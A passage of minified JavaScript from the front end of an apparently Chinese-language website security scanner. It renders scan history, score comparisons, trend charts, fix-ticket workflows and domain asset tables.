n.indexOf(v)===-1}).length;c>0&&F("已修复 "+c+" 个安全问题");let g=Object.assign({},ce,{score:t.new_score,risk_level:t.new_risk_level,findings:t.new_findings});ce=g,$t(g),_e("result"),Pe()}else F("验证失败: "+Ne(t),"error")}).catch(function(t){i&&(i.disabled=!1,i.textContent="验证修复效果"),F("验证扫描出错: "+t.message,"error")})}function dn(e){mi()}function ms(){confirm("确定要清空所有扫描历史吗？此操作不可恢复。")&&ue("/api/history",{method:"DELETE"}).then(function(e){return e.json()}).then(function(e){F("已清空 "+(e.deleted||0)+" 条扫描历史"),mi(),vt()}).catch(function(){F("清空失败，请检查网络","error")})}function ys(){ot=!ot,Ae=[];let e=document.getElementById("history-compare-bar");e&&(e.style.display=ot?"flex":"none"),cn(),vt(Ut)}function bs(){ot=!1,Ae=[];let e=document.getElementById("history-compare-bar");e&&(e.style.display="none"),vt(Ut)}function xs(e){let i=Ae.indexOf(e);if(i>=0)Ae.splice(i,1);else{if(Ae.length>=2){F("最多选择 2 条记录进行对比");return}Ae.push(e)}cn(),vt(Ut)}function cn(){let e=document.getElementById("history-compare-count"),i=document.getElementById("history-compare-btn");e&&(e.textContent=String(Ae.length)),i&&(i.disabled=Ae.length!==2)}function ws(){if(Ae.length!==2){F("请选择 2 条记录");return}ue("/api/history?limit=50").then(function(e){return e.json()}).then(function(e){let i=e.history||[],t=i[Ae[0]],r=i[Ae[1]];if(!t||!r){F("记录不存在");return}let s=ks(t,r),o='<div class="card" style="margin-bottom:16px">';o+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">',o+='<div class="card-title"> 历史对比</div>',o+='<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="cancelHistoryCompare()">关闭</button>',o+="</div>",o+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px">',o+='<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">',o+='<div style="font-size:12px;color:var(--text-secondary)">'+E(t.created_at||t.time||"")+"</div>",o+='<div style="font-size:24px;font-weight:800;color:'+Pt(t.score)+'">'+(t.score||0)+"</div>",o+="</div>",o+='<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">',o+='<div style="font-size:12px;color:var(--text-secondary)">'+E(r.created_at||r.time||"")+"</div>",o+='<div style="font-size:24px;font-weight:800;color:'+Pt(r.score)+'">'+(r.score||0)+"</div>",o+="</div>",o+="</div>",o+='<div style="font-size:13px;margin-bottom:8px">分数变化：'+(s.scoreDelta>0?"+":"")+s.scoreDelta+" "+(s.scoreDelta>0||s.scoreDelta<0?"":"->")+"</div>",s.newIssues.length&&(o+='<div style="font-size:12px;color:var(--danger);margin-bottom:6px">新增问题（'+s.newIssues.length+"）</div>",s.newIssues.forEach(function(n){o+='<div style="font-size:12px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;margin-bottom:4px">'+E(n.name||n)+"</div>"})),s.fixedIssues.length&&(o+='<div style="font-size:12px;color:var(--success);margin-bottom:6px;margin-top:8px"> 已修复问题（'+s.fixedIssues.length+"）</div>",s.fixedIssues.forEach(function(n){o+='<div style="font-size:12px;padding:4px 8px;background:rgba(115,201,144,0.08);border-radius:2px;margin-bottom:4px">'+E(n.name||n)+"</div>"})),!s.newIssues.length&&!s.fixedIssues.length&&(o+='<div style="font-size:12px;color:var(--text-secondary);text-align:center">两次扫描结果一致，无变化</div>'),o+="</div>";let a=Ye("scan-history-list");a&&(a.innerHTML=o),He("history-pagination","none")}).catch(function(){F("加载失败")})}function ks(e,i){let t=(e.findings||[]).map(function(a){return a.name||a}),r=(i.findings||[]).map(function(a){return a.name||a}),s=[],o=[];return r.forEach(function(a){t.indexOf(a)===-1&&s.push({name:a})}),t.forEach(function(a){r.indexOf(a)===-1&&o.push({name:a})}),{scoreDelta:(i.score||0)-(e.score||0),newIssues:s,fixedIssues:o}}function pn(e){let i=document.getElementById("history-trend-wrap"),t=document.getElementById("history-trend-chart");if(!i||!t)return;let r=e.slice(0,5).reverse();if(r.length<2){i.style.display="none";return}i.style.display="block";let s=t.clientWidth||300,o=60,a=4,n=100,c=r.map(function(d,f){let h=a+f/(r.length-1)*(s-a*2),m=o-a-(d.score||0)/n*(o-a*2);return{x:Math.round(h),y:Math.round(m),score:d.score||0}}),g='<svg width="'+s+'" height="'+o+'" style="overflow:visible">';g+='<line x1="'+a+'" y1="'+o/2+'" x2="'+(s-a)+'" y2="'+o/2+'" stroke="var(--border)" stroke-width="1" stroke-dasharray="2,2"/>';let v=c.map(function(d,f){return(f===0?"M":"L")+d.x+","+d.y}).join(" ");g+='<path d="'+v+'" fill="none" stroke="var(--primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>',c.forEach(function(d){let f=d.score>=75?"#73c990":d.score>=50?"#f0a732":"#c75450";g+='<circle cx="'+d.x+'" cy="'+d.y+'" r="3" fill="'+f+'"/>'}),g+="</svg>",t.innerHTML=g}function vt(e){e=e||1,Ut=e;let i=Ye("scan-history-list");if(i){if(!ve()){i.innerHTML='<p style="text-align:center;color:var(--text-lighter);padding:20px 0">请先登录查看扫描历史</p>',He("history-pagination","none");return}i.innerHTML='<p style="text-align:center;color:var(--text-lighter);padding:20px 0">正在读取扫描历史...</p>',ue("/api/history?limit=50").then(function(t){return t.json()}).then(function(t){let r=t.history||[];if(r.length===0){i.innerHTML=`<div style="text-align:center;color:var(--text-lighter);padding:30px 0"><div style="font-size:13px">暂无扫描记录</div><div style="font-size:12px;margin-top:6px">点首页「开始扫描」试试</div><div style="margin-top:12px"><button class="fixer-btn primary" onclick="navigateTo('scan')">开始扫描</button></div></div>`,He("history-pagination","none");let c=document.getElementById("history-trend-wrap");c&&(c.style.display="none");return}pn(r);let s=Math.ceil(r.length/Gt),o=(e-1)*Gt,a=r.slice(o,o+Gt),n="";ot||(n+='<div style="text-align:right;margin-bottom:8px">',n+='<button class="fixer-btn secondary" style="height:28px;padding:0 10px;font-size:12px" onclick="toggleHistoryCompareMode()"> 对比模式</button>',n+="</div>"),a.forEach(function(c,g){let v=o+g,d=c.score>=75?"var(--success)":c.score>=50?"var(--warning)":"var(--danger)",f=(r[v+1]||{}).score,h="";if(typeof f=="number"&&(h=(c.score||0)>f?' <span style="color:var(--success);font-size:12px"></span>':(c.score||0)<f?' <span style="color:var(--danger);font-size:12px"></span>':' <span style="color:var(--text-lighter);font-size:12px">-></span>'),ot){let m=Ae.indexOf(v)>=0?"checked":"";n+='<label class="menu-item" style="margin-bottom:6px;cursor:pointer;display:flex;align-items:center;gap:10px">',n+='<input type="checkbox" '+m+' onchange="onHistorySelect('+v+')" style="width:16px;height:16px;accent-color:var(--primary)">',n+='<div style="flex:1">',n+='<div style="font-weight:600;font-size:14px">'+E(c.url||c.host||"")+"</div>",n+='<div style="font-size:12px;color:var(--text-light)">'+E(c.created_at||c.time||"")+" &middot; 发现 "+(c.findings_count||0)+" 个问题</div>",n+="</div>",n+='<div style="font-size:20px;font-weight:800;color:'+d+'">'+(c.score||0)+h+"</div>",n+="</label>"}else n+='<div class="menu-item" style="margin-bottom:6px;cursor:pointer" onclick="restoreScanFromHistory('+v+')" role="button" tabindex="0" aria-label="恢复 '+E(c.url||c.host||"")+' 的扫描结果">',n+='<div style="flex:1">',n+='<div style="font-weight:600;font-size:14px">'+E(c.url||c.host||"")+"</div>",n+='<div style="font-size:12px;color:var(--text-light)">'+E(c.created_at||c.time||"")+" &middot; 发现 "+(c.findings_count||0)+" 个问题</div>",n+="</div>",n+='<div style="font-size:20px;font-weight:800;color:'+d+'">'+(c.score||0)+h+"</div>",n+="</div>"}),i.innerHTML=n,oi("history-pagination",e,s,"renderScanHistory")}).catch(function(){i.innerHTML='<p style="text-align:center;color:var(--danger);padding:20px 0">加载失败，请检查网络</p>'})}}function _s(e){ue("/api/history?limit=50").then(function(i){return i.json()}).then(function(i){let t=i.history||[];if(!t[e])return;let r=t[e];_e("scan");let s=document.getElementById("scan-url");s&&(s.value=r.url||""),F('已填入历史网址，点击"下一步"重新扫描')}).catch(function(){F("加载历史记录失败")})}function mi(){if(!ve()){rt("stat-scan-count","0"),rt("stat-avg-score","-"),rt("stat-fixed-count","0");return}ue("/api/history?limit=50").then(function(e){return e.json()}).then(function(e){let i=e.history||[],t=e.stats||{scan_count:i.length,fixed_count:0},r=document.getElementById("stat-scan-count"),s=document.getElementById("stat-avg-score"),o=document.getElementById("stat-fixed-count");if(r&&(r.textContent=t.scan_count||i.length),s)if(i.length===0)s.textContent="-";else{let a=i.reduce(function(n,c){return n+(c.score||0)},0);s.textContent=Math.round(a/i.length)}o&&(o.textContent=t.fixed_count||0)}).catch(function(){})}window.startScanDirect=gi;window.startScan=hi;window.updateScanStartState=at;window.dismissHomeOnboarding=Br;window.goVerifyStep2=Vr;window.cancelScan=Qr;window.quickDemo=Wr;window.showFullScanDetail=Zr;window.downloadReport=Ir;window.toggleReportDropdown=Cr;window.showBatchScanModal=Dr;window.closeBatchScanModal=Ur;window.doBatchScan=$r;window.copyToken=Kr;window.selectVerifyMethod=Xr;window.confirmVerification=Jr;window.skipVerification=Gr;window.loadPublicDemo=Mr;window.goToFixerWithScanResult=cs;window.switchFixLang=ps;window.clearScanHistory=ms;window.cancelHistoryCompare=bs;window.doHistoryCompare=ws;window.addMonitorTarget=Er;window.scanRedirectTarget=rs;window.copyFixCode=qr;window.renderResult=$t;window.selectFinding=an;window.toggleFinding=as;window.shareResult=ss;window.showPdfDownloadTip=os;window.restoreScanFromHistory=_s;window.updateProfileStats=mi;window.renderScanHistory=vt;window.renderMonitorTargets=fi;window.renderHistoryTrendChart=pn;window.toggleHistoryCompareMode=ys;window.onHistorySelect=xs;window.removeMonitorTarget=zr;window.generateFixFromResult=ls;window.verifyFix=vs;window.downloadAllFixes=hs;window.downloadFixCode=gs;window.copyFixCodeByLang=fs;window.switchFixPlatform=us;window.switchPublicFixTab=Rr;window.doPublicDemoFix=Fr;window.renderFixComparison=en;window.showAutoFixDialog=jr;window.closeAutoFixDialog=Hr;window.executeAutoFix=Nr;window.retryScan=ns;window.retryScanWithUrl=ts;window.backToScanInput=is;window.calculateScore=Yr;window.loadDashboard=Or;window.loadTrend=Yi;window.drawTrendChart=Qi;window.renderRadarChart=Vi;window.buildRadarSvg=on;window.animateScoreProgress=Xi;window.simulateCSRF=kr;window.simulateXSS=_r;window.simulateClickjacking=Sr;window.updateStage=Ht;window.animateStages=nn;window.finishStages=je;window.startProgressAnimation=rn;window.stopProgressAnimation=ii;window.setScanProgress=sn;window.updateScanCreditsHint=Ki;window.loadTrendChart=function(e){e=e||30;let i=document.getElementById("trend-chart");if(!i)return;document.querySelectorAll(".trend-range").forEach(function(r){let s=parseInt(r.getAttribute("data-days"),10)===e;r.style.background=s?"#4b6eaf":"#45494a",r.style.color=s?"#fff":"#808080",r.style.borderColor=s?"#4b6eaf":"#555555"});let t=new Date;t.setDate(t.getDate()-e),t.setHours(0,0,0,0),Ue("/api/trend?limit="+e).then(function(r){if(!r||!r.success){i.innerHTML="<span>暂无趋势数据</span>";return}let s=r.data&&r.data.series?r.data.series:{},o=Object.keys(s);if(o.length===0){i.innerHTML="<span>扫描几个目标后，即可查看分数变化趋势。</span>";return}let a={},n=0;if(o.forEach(function(v){(s[v]||[]).forEach(function(d){let f=d.time?d.time.replace(" ","T"):"",h=new Date(f);if(!h||isNaN(h.getTime())||h<t)return;n++;let m=f.split("T")[0];a[m]||(a[m]={sum:0,count:0}),a[m].sum+=typeof d.score=="number"?d.score:parseInt(d.score,10)||0,a[m].count++})}),n===0){i.innerHTML="<span>扫描几个目标后，即可查看分数变化趋势。</span>";return}let c=Object.keys(a).sort(),g=c.map(function(v){return Math.round(a[v].sum/a[v].count)});i.innerHTML=Ss(g,c)}).catch(function(r){i.innerHTML="<span>加载趋势失败，请稍后重试</span>"})};function Ss(e,i,t){if(!e||e.length===0)return"<span>暂无数据</span>";let r=640,s=120,o={top:10,right:10,bottom:24,left:30},a=r-o.left-o.right,n=s-o.top-o.bottom,c=Math.max(0,Math.min.apply(null,e)-5),v=Math.min(100,Math.max.apply(null,e)+5)-c||1;function d(O){return o.left+O/(e.length-1||1)*a}function f(O){return o.top+n-(O-c)/v*n}let h="M"+e.map(function(O,j){return d(j).toFixed(1)+" "+f(O).toFixed(1)}).join(" L"),m=h+" L"+d(e.length-1).toFixed(1)+" "+(s-o.bottom).toFixed(1)+" L"+d(0).toFixed(1)+" "+(s-o.bottom).toFixed(1)+" Z",u=e.map(function(O,j){return'<circle cx="'+d(j).toFixed(1)+'" cy="'+f(O).toFixed(1)+'" r="2.5" fill="#4b6eaf"/>'}).join(""),y=i[0]?i[0].slice(5):"",b=i[i.length-1]?i[i.length-1].slice(5):"",k=e[e.length-1],x=d(e.length-1),I=f(k),z='<rect x="'+(x-16)+'" y="'+(I-18)+'" width="32" height="14" rx="2" fill="#4b6eaf"/>',M='<text x="'+x+'" y="'+(I-8)+'" text-anchor="middle" font-size="9" fill="#fff">'+k+"</text>";return'<svg viewBox="0 0 '+r+" "+s+'" style="width:100%;height:100%"><defs><linearGradient id="trendGrad" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#4b6eaf" stop-opacity="0.35"/><stop offset="100%" stop-color="#4b6eaf" stop-opacity="0.05"/></linearGradient></defs><rect x="'+o.left+'" y="'+o.top+'" width="'+a+'" height="'+n+'" fill="rgba(0,0,0,0.1)" rx="2"/><path d="'+m+'" fill="url(#trendGrad)"/><path d="'+h+'" fill="none" stroke="#4b6eaf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>'+u+z+M+'<text x="'+o.left+'" y="'+(s-6)+'" font-size="10" fill="#808080">'+E(y)+'</text><text x="'+(r-o.right)+'" y="'+(s-6)+'" text-anchor="end" font-size="10" fill="#808080">'+E(b)+"</text></svg>"}window.addEventListener("load",function(){ft();let e=document.getElementById("scan-url");e&&e.addEventListener("input",ft);let i=document.getElementById("auth-check-step1");i&&i.addEventListener("change",ft);let t=document.getElementById("auth-check");t&&t.addEventListener("change",ft)});function Es(e){let i=Object.assign({},e);const t=new Set;return{getState(){return i},setState(r){i=Object.assign({},i,r),t.forEach(function(s){try{s(i)}catch(o){console.error("store subscriber error:",o)}})},subscribe(r){return t.add(r),function(){t.delete(r)}}}}const we=Es({tickets:[],ticketFilter:"pending",user:null});async function zs(){const e=await Zn(),i=e&&e.tickets?e.tickets:[];return we.setState({tickets:i}),e}function Is(e){we.setState({ticketFilter:e})}function Ts(){const e=we.getState();return e.tickets.filter(function(i){return i.status===e.ticketFilter})}function mt(e){return we.getState().tickets.find(function(t){return t.id===e})||null}async function Cs(e,i){const t=await ai(e,{status:i}),s=we.getState().tickets.map(function(o){return o.id===e?Object.assign({},o,{status:i}):o});return we.setState({tickets:s}),t}async function As(e,i){const t=await ai(e,{notes:i}),s=we.getState().tickets.map(function(o){return o.id===e?Object.assign({},o,{notes:i}):o});return we.setState({tickets:s}),t}async function Bs(e){const i=await Ui(e),r=we.getState().tickets.filter(function(s){return s.id!==e});return we.setState({tickets:r}),i}async function Ls(e,i){const t=[];for(let o=0;o<e.length;o++)t.push(await ai(e[o],{status:i}));const s=we.getState().tickets.map(function(o){return e.indexOf(o.id)!==-1?Object.assign({},o,{status:i}):o});return we.setState({tickets:s}),t}async function Os(e){const i=[];for(let s=0;s<e.length;s++)i.push(await Ui(e[s]));const r=we.getState().tickets.filter(function(s){return e.indexOf(s.id)===-1});return we.setState({tickets:r}),i}async function Ms(e){const i=await Ge("/api/fix-tickets/"+e+"/verify",{rescan:!0});return we.setState({lastVerifiedAt:Date.now()}),i}const $e={severityClass:function(e){return e==="high"||e==="critical"?"high":e==="medium"?"medium":"low"},severityLabel:function(e){return{critical:"严重",high:"高危",medium:"中危",low:"低危"}[e]||e},statusLabel:function(e){return{pending:"待修复",confirmed:"已确认",applying:"应用中",in_progress:"修复中",fixed:"已修复",failed:"修复失败",rolled_back:"已回滚",ignored:"已忽略"}[e]||e}};let Li=!1;function Ps(e){if(Li)return;Li=!0;const i=document.body;i&&(i.addEventListener("click",Rs),i.addEventListener("change",Fs))}function Rs(e){if(e.target.closest(".ticket-checkbox")||e.target.closest(".ticket-check"))return;const i=e.target.closest("[data-action]");if(!i)return;const t=i.dataset.action,r=i.dataset.id?parseInt(i.dataset.id,10):null,s=i.dataset.status||null;switch(t){case"switch-ticket-tab":s&&js(s);break;case"show-detail":r&&qt(r);break;case"verify":r&&Vs(r);break;case"edit-notes":r&&$s(r);break;case"open-fixer":r&&hn(r);break;case"open-report":r&&qs(r);break;case"copy-summary":r&&Ws(r);break;case"delete":r&&Us(r);break;case"batch-update":s&&Hs(s);break;case"batch-delete":Ns();break;case"toggle-select-all":fn(i);break}}function Fs(e){const i=e.target;if(i.classList.contains("ticket-checkbox")){yi();return}const t=i.closest("[data-action]");if(!t)return;const r=t.dataset.action,s=t.dataset.id?parseInt(t.dataset.id,10):null;switch(r){case"change-status":s&&Ds(s,i.value);break;case"toggle-select-all":fn(i);break}}function js(e){Is(e),document.querySelectorAll(".ticket-tab").forEach(function(i){i.classList.toggle("active",i.dataset.status===e)}),un()}function et(){if(!ve()){He("ticket-workbench","none"),He("ticket-empty","block"),He("ticket-batch-bar","none"),ji("ticket-empty",'<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>请先登录查看工单</p></div>');return}return zs().then(function(){un()}).catch(function(e){F("加载工单失败: "+e.message,"error")})}function un(){let e=document.getElementById("ticket-list"),i=document.getElementById("ticket-empty"),t=document.getElementById("ticket-batch-bar"),r=document.getElementById("ticket-workbench"),s=document.getElementById("ticket-detail-panel");if(!e)return;let o=Ts();if(o.length===0){e.innerHTML="",i&&(i.style.display="block"),t&&(t.style.display="none"),r&&(r.style.display="none"),s&&(s.innerHTML='<div class="ticket-detail-empty">选择左侧工单查看详情</div>');return}i&&(i.style.display="none"),t&&(t.style.display="flex"),r&&(r.style.display="flex");let a="";o.forEach(function(n){let c=$e.severityClass(n.severity),g=$e.severityLabel(n.severity),v=$e.statusLabel(n.status);a+='<tr class="ticket-row" data-action="show-detail" data-id="'+n.id+'">',a+='<td><label class="ticket-check"><input type="checkbox" class="ticket-checkbox" value="'+n.id+'"></label></td>',a+='<td class="ticket-title-cell">'+E(n.finding_name)+"</td>",a+='<td><span class="ticket-severity '+c+'">'+g+"</span></td>",a+='<td><span class="ticket-status-badge">'+v+"</span></td>",a+='<td class="ticket-date-cell">'+(n.created_at||"")+"</td>",a+="</tr>"}),e.innerHTML=a,yi()}function qt(e){let i=mt(e);if(!i)return;let t=document.getElementById("ticket-detail-panel");if(!t)return;let r=$e.severityClass(i.severity),s=$e.severityLabel(i.severity),o=$e.statusLabel(i.status),a='<div class="ticket-detail-header">';if(a+='<div class="ticket-detail-title">'+E(i.finding_name)+"</div>",a+='<div class="ticket-detail-badges"><span class="ticket-severity '+r+'">'+s+'</span><span class="ticket-status-badge">'+o+"</span></div>",a+="</div>",a+='<div class="ticket-detail-meta">工单 #'+i.id+(i.scan_id?" · 扫描 #"+i.scan_id:"")+" · "+(i.created_at||"")+"</div>",a+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">',a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">建议：'+(i.status==="fixed"?"尽快复测确认":i.status==="failed"?"回看失败原因并回滚":i.status==="applying"?"等待变更生效后复测":"推进修复并保留变更记录")+"</div>",a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">优先级：'+s+"</div>",i.finding_type&&(a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">类型：'+E(i.finding_type)+"</div>"),a+="</div>",a+='<div class="ticket-detail-section"><div class="ticket-detail-label">修复闭环</div>',a+='<div class="ticket-timeline" id="ticket-timeline-'+i.id+'"><div class="ticket-timeline-loading">正在读取时间线...</div></div></div>',i.fix_code&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">修复代码</div><pre class="ticket-detail-code">'+E(i.fix_code)+"</pre></div>"),i.url&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">漏洞位置</div><code class="ticket-detail-url">'+E(i.url)+"</code></div>"),i.notes&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">备注</div><div class="ticket-detail-notes">'+E(i.notes)+"</div></div>"),i.diff_summary&&i.diff_summary!=="{}")try{let n=JSON.parse(i.diff_summary);a+='<div class="ticket-detail-section"><div class="ticket-detail-label">复测结果</div>',a+='<div class="ticket-diff-summary">',n.verified_fixed&&(a+='<div class="ticket-diff-item success">已验证修复</div>'),n.summary&&(a+='<div class="ticket-diff-stats">消除 '+(n.summary.eliminated_count||0)+" · 新增 "+(n.summary.new_count||0)+" · 保留 "+(n.summary.retained_count||0)+"</div>",a+='<div class="ticket-diff-score">评分变化：'+(n.before_score||0)+" → "+(n.after_score||0)+" ("+(n.score_delta>0?"+":"")+n.score_delta+")</div>"),a+="</div></div>"}catch{}a+='<div class="ticket-detail-actions">',a+='<select class="ticket-status-select" data-action="change-status" data-id="'+i.id+'" title="选择当前修复进度">',a+='<option value="pending"'+(i.status==="pending"?" selected":"")+">待修复</option>",a+='<option value="confirmed"'+(i.status==="confirmed"?" selected":"")+">已确认</option>",a+='<option value="applying"'+(i.status==="applying"?" selected":"")+">应用中</option>",a+='<option value="in_progress"'+(i.status==="in_progress"?" selected":"")+">修复中</option>",a+='<option value="fixed"'+(i.status==="fixed"?" selected":"")+">已修复</option>",a+='<option value="failed"'+(i.status==="failed"?" selected":"")+">修复失败</option>",a+='<option value="rolled_back"'+(i.status==="rolled_back"?" selected":"")+">已回滚</option>",a+='<option value="ignored"'+(i.status==="ignored"?" selected":"")+">已忽略</option>",a+="</select>",a+='<button class="ticket-btn primary" data-action="verify" data-id="'+i.id+'">复测验证</button>',a+='<button class="ticket-btn secondary" data-action="open-fixer" data-id="'+i.id+'">去修复器</button>',a+='<button class="ticket-btn secondary" data-action="open-report" data-id="'+i.id+'">回到报告</button>',a+='<button class="ticket-btn secondary" data-action="copy-summary" data-id="'+i.id+'">复制摘要</button>',a+='<button class="ticket-btn secondary" data-action="edit-notes" data-id="'+i.id+'">备注</button>',a+='<button class="ticket-btn danger" data-action="delete" data-id="'+i.id+'">删除</button>',a+="</div>",t.innerHTML=a,Zs(i.id),document.querySelectorAll(".ticket-row").forEach(function(n){n.classList.toggle("selected",parseInt(n.dataset.id)===e)})}function yi(){let e=document.querySelectorAll(".ticket-checkbox:checked"),i=document.getElementById("ticket-selected-count");i&&(i.textContent="已选 "+e.length+" 项")}function fn(e){let i=e?e.checked:!1;document.querySelectorAll(".ticket-checkbox").forEach(function(t){t.checked=i}),document.querySelectorAll('[data-action="toggle-select-all"]').forEach(function(t){t.checked=i}),yi()}function gn(){let e=[];return document.querySelectorAll(".ticket-checkbox:checked").forEach(function(i){e.push(parseInt(i.value,10))}),e}function Hs(e){let i=gn();if(i.length===0){F("请先选择工单","error");return}Ls(i,e).then(function(){return F("已批量更新 "+i.length+" 个工单","success"),et()}).catch(function(t){F("批量更新失败: "+t.message,"error")})}function Ns(){let e=gn();if(e.length===0){F("请先选择工单","error");return}confirm("确定删除选中的 "+e.length+" 个工单？")&&Os(e).then(function(){return F("已批量删除 "+e.length+" 个工单","success"),et()}).catch(function(i){F("批量删除失败: "+i.message,"error")})}function Ds(e,i){Cs(e,i).then(function(){return F("状态已更新","success"),et().then(function(){qt(e)})}).catch(function(t){F("更新失败: "+t.message,"error")})}function Us(e){confirm("确定删除该工单？")&&Bs(e).then(function(){F("工单已删除","success");let i=document.getElementById("ticket-detail-panel");return i&&(i.innerHTML='<div class="ticket-detail-empty">选择左侧工单查看详情</div>'),et()}).catch(function(i){F("删除失败: "+i.message,"error")})}function $s(e){let i=mt(e),t=prompt("编辑备注:",i&&i.notes?i.notes:"");t!==null&&As(e,t).then(function(){return F("备注已保存","success"),et().then(function(){qt(e)})}).catch(function(r){F("保存失败: "+r.message,"error")})}function hn(e){let i=mt(e);if(i){try{i.url&&window.localStorage&&localStorage.setItem("vs_fixer_ticket",JSON.stringify({ticket_id:i.id,scan_id:i.scan_id||null,url:i.url,finding_name:i.finding_name||"",finding_type:i.finding_type||"",severity:i.severity||"low"}))}catch{}typeof window.navigateTo=="function"?window.navigateTo("fixer"):window.location.hash="#page-fixer"}}function qs(e){mt(e)&&(typeof window.navigateTo=="function"?window.navigateTo("home"):window.location.hash="#page-home")}function Ws(e){let i=mt(e);if(!i)return;let t=[];(i.status||"").toLowerCase()!=="done"&&t.push("优先复测并确认修复效果"),((i.severity||"").toLowerCase()==="critical"||(i.severity||"").toLowerCase()==="high")&&t.push("先处理暴露面和高危配置");let r=["工单 #"+i.id,"名称: "+(i.finding_name||""),"等级: "+($e.severityLabel(i.severity)||i.severity||""),"状态: "+($e.statusLabel(i.status)||i.status||""),"来源 URL: "+(i.url||""),"备注: "+(i.notes||""),"下一步: "+(t.length?t.join("；"):"当前工单可直接进入复测")].join(`
`);ht(r).then(function(){F("工单摘要已复制")})}function Zs(e){let i=document.getElementById("ticket-timeline-"+e);i&&Ue("/api/fix-tickets/"+e+"/timeline").then(function(t){if(!t||!t.timeline){i.innerHTML='<div class="ticket-timeline-empty">暂无时间线数据</div>';return}let r='<div class="ticket-timeline-steps">';t.timeline.forEach(function(s,o){let a="step-"+s.status,n={done:"✓",doing:"●",pending:"○",failed:"✗",rolled_back:"↩"}[s.status]||"○";r+='<div class="ticket-timeline-step '+a+'">',r+='<div class="ticket-timeline-icon">'+n+"</div>",r+='<div class="ticket-timeline-content">',r+='<div class="ticket-timeline-label">'+E(s.label)+"</div>",s.time&&(r+='<div class="ticket-timeline-time">'+E(s.time)+"</div>"),r+="</div></div>",o<t.timeline.length-1&&(r+='<div class="ticket-timeline-line"></div>')}),r+="</div>",i.innerHTML=r}).catch(function(){i.innerHTML='<div class="ticket-timeline-empty">加载失败</div>'})}function Vs(e){if(!confirm("确定对工单 #"+e+" 复测验证？系统会重新扫描并对比修复效果。"))return;let i=document.querySelector('.ticket-detail-actions [data-action="verify"][data-id="'+e+'"]');i&&(i.textContent="验证中...",i.disabled=!0),Ms(e).then(function(t){if(Dt(t)){F(Rt(t),"error"),Pe();return}if(t&&t.success){let r=t.status==="fixed"?"复测通过：漏洞已修复！":"复测完成：漏洞仍存在";return F(r,t.status==="fixed"?"success":"warning"),Pe(),t.status==="fixed"&&setTimeout(function(){hn(e)},300),et().then(function(){qt(e)})}else F("验证失败："+(t&&t.error?t.error:"未知错误"),"error")}).catch(function(t){F("验证请求失败","error")}).finally(function(){i&&(i.textContent="复测验证",i.disabled=!1)})}function Xs(){try{return localStorage.getItem("vs_token")}catch{return null}}function Gs(){return!!Xs()}function Js(e){if(!e)return"未知错误";if(typeof e.error=="string"&&e.error)return e.error;if(typeof e.detail=="string"&&e.detail)return e.detail;if(typeof e.message=="string"&&e.message)return e.message;if(Array.isArray(e.detail)&&e.detail.length>0){let i=e.detail.map(function(t){return t&&typeof t.msg=="string"?t.msg:t&&typeof t=="string"?t:""}).filter(Boolean);if(i.length>0)return i.join("；")}return"未知错误"}let nt=[];function Ks(){if(!Gs()){ji("asset-list",""),He("asset-empty","block");let e=document.getElementById("asset-empty");e&&(e.innerHTML='<div class="ticket-empty-icon"></div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>');return}ue("/api/assets").then(function(e){return e.json()}).then(function(e){e&&e.assets?(nt=e.assets,Jt(nt)):(nt=[],Jt(nt))}).catch(function(e){F("加载资产失败: "+e.message,"error"),nt=[],Jt(nt)})}function Jt(e){let i=document.getElementById("asset-list"),t=document.getElementById("asset-empty");if(!i)return;if(!e||e.length===0){i.innerHTML="",t&&(t.style.display="block",t.innerHTML='<div class="ticket-empty-icon"></div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>');return}t&&(t.style.display="none");let r='<div class="asset-table-wrap"><table class="asset-table">';r+="<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>",e.forEach(function(s){let o=s.verified||!1,a=o?"verified":"pending",n=o?"已验证":"待验证",c=s.score,g="high";c==null?(c="-",g=""):c<50?g="low":c<75&&(g="medium"),r+="<tr>",r+='<td data-label="域名"><div class="asset-domain">'+E(s.domain||"")+'</div><div class="asset-meta">'+E(s.description||"")+"</div></td>",r+='<td data-label="负责人">'+E(s.owner||"-")+"</td>",r+='<td data-label="验证状态"><span class="asset-badge '+a+'">'+n+"</span></td>",r+='<td data-label="评分"><div class="asset-score '+g+'">'+c+"</div></td>",r+='<td data-label="操作"><div class="asset-actions">',r+='<button class="asset-btn primary" onclick="scanAsset('+s.id+", '"+be(s.domain||"")+`')">扫描</button>`,r+='<button class="asset-btn secondary" onclick="editAsset('+s.id+')">编辑</button>',r+='<button class="asset-btn danger" onclick="deleteAsset('+s.id+')">删除</button>',r+="</div></td>",r+="</tr>"}),r+="</tbody></table></div>",i.innerHTML=r}function Ys(){let e=document.getElementById("asset-domain").value.trim(),i=document.getElementById("asset-owner").value.trim(),t=document.getElementById("asset-description").value.trim(),r=document.getElementById("asset-form-error");if(!e){r&&(r.textContent="请输入域名",r.style.display="block");return}r&&(r.style.display="none"),ue("/api/assets",{method:"POST",body:JSON.stringify({domain:e,owner:i,description:t})}).then(function(s){return 